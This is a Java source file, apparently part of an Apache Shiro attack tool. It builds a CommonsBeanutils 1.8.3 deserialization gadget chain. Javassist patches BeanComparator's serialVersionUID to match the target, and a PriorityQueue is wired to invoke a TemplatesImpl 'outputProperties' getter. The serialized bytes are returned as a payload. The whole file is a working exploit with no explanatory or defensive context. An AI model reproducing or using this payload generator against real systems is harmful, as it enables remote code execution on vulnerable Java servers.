package org.shiroattack;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB183 {
    public static byte[] CBWithoutCC(Object template) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Gadgets.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Gadgets.setFieldValue(beanComparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) Gadgets.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

}
